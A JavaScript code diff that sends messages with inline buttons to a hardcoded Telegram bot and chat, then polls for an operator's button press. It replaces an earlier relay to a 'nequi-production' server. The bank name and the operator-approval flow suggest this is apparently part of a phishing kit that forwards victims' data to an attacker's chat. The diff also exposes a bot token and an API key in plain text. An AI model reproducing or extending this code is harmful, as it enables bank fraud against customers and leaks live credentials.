@@ -1,82 +1,72 @@
-// ================================================================
-// js/sendTelegramMessage.js
-// ================================================================
+const BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';
+const CHAT_ID = '6958936698'; // 
 
 async function sendTelegramMessageWithBtn(mensaje, teclado) {
-  const url = "https://nequi-production.up.railway.app/send-message";
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
   
   console.log("📤 Enviando mensaje a Telegram...");
-  console.log("Mensaje:", mensaje);
-  console.log("Teclado:", teclado);
+  
+  const body = {
+    chat_id: CHAT_ID,
+    text: mensaje,
+    parse_mode: 'Markdown'
+  };
+  
+  if (teclado) {
+    body.reply_markup = JSON.parse(teclado);
+  }
   
   try {
     const response = await fetch(url, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "x-api-key-authorization": "a8B3dE4F9gH2JkL5mN",
-        "x-client-id": "user1",
-      },
-      body: JSON.stringify({
-        mensaje: mensaje,
-        teclado: teclado,
-      }),
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
     });
-
-    console.log("📡 Respuesta del servidor:", response.status);
-
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error("❌ Error del servidor:", errorText);
-      throw new Error(`${response.status}: ${errorText}`);
-    }
-
-    const responseData = await response.json();
-    console.log("✅ Mensaje enviado exitosamente:", responseData);
-    return responseData;
+    
+    const data = await response.json();
+    console.log("✅ Mensaje enviado:", data);
+    return data.result;
     
   } catch (error) {
-    console.error("❌ Error en sendTelegramMessageWithBtn:", error);
+    console.error("❌ Error:", error);
     throw error;
   }
 }
 
 async function waitForButtonPress(messageId, timeout = 120) {
-  const url = "https://nequi-production.up.railway.app/wait-action";
+  console.log("⏳ Esperando acción del usuario...");
   
-  console.log("⏳ Esperando respuesta del operador...");
-  console.log("Message ID:", messageId);
+  let lastUpdateId = 0;
+  const startTime = Date.now();
   
-  try {
-    const response = await fetch(url, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-        "x-api-key-authorization": "a8B3dE4F9gH2JkL5mN",
-        "x-client-id": "user1",
-      },
-      body: JSON.stringify({
-        message_id: messageId,
-        totalTimeoutMs: timeout * 1000,
-        pollTimeoutSec: 5,
-        removeKeyboard: true,
-      }),
-    });
-
-    console.log("📡 Respuesta del servidor:", response.status);
-
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error("❌ Error del servidor:", errorText);
-      throw new Error(`${response.status}: ${errorText}`);
-    }
-
-    const respuesta = await response.json();
-    console.log("✅ Acción recibida del operador:", respuesta);
-    return respuesta;
-    
-  } catch (error) {
-    console.error("❌ Error en waitForButtonPress:", error);
-    throw error;
-  }
+  return new Promise((resolve, reject) => {
+    const checkInterval = setInterval(async () => {
+      try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+        const response = await fetch(url);
+        const data = await response.json();
+        
+        if (data.result && data.result.length > 0) {
+          for (const update of data.result) {
+            lastUpdateId = update.update_id;
+            
+            if (update.callback_query && update.callback_query.message.message_id === messageId) {
+              clearInterval(checkInterval);
+              console.log("✅ Acción recibida:", update.callback_query.data);
+              resolve({ action: update.callback_query.data });
+              return;
+            }
+          }
+        }
+        
+        if (Date.now() - startTime > timeout * 1000) {
+          clearInterval(checkInterval);
+          reject(new Error('Timeout'));
+        }
+        
+      } catch (error) {
+        console.error("Error en polling:", error);
+      }
+    }, 2000);
+  });
 }
